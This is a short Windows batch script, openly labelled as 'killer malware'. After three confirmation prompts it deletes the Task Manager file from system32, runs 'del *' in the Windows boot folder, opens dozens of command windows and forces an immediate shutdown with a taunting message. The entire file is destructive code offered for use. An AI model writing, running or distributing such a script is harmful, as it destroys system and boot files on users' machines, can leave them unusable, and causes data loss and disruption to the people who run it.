@ECHO OFF

:choice
set /P c=You are about to run a virus, Continue? [Y/N]?
if /I "%c%" EQU "Y" goto :y
if /I "%c%" EQU "N" goto :n
goto :choice


:y

:choice2
set /P c=This is some killer malware Continue? [Y/N]?
if /I "%c%" EQU "Y" goto :y2
if /I "%c%" EQU "N" goto :n
goto :choice2


:y2
:choice3
set /P c=This is The last warning, CREATOR IS NOT RESPONSABLE FOR ANY DAMAGE [Y/N]?
if /I "%c%" EQU "Y" goto :y3
if /I "%c%" EQU "N" goto :n
goto :choice3

:y3
echo Ok if you insist...
pause > nul
del C:/Windows/system32/taskmgr
cd C:/Windows/boot
del *
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
start
shutdown -s -t 1 -c "You should be wishing you havn't ran this"




:n
pause
exit
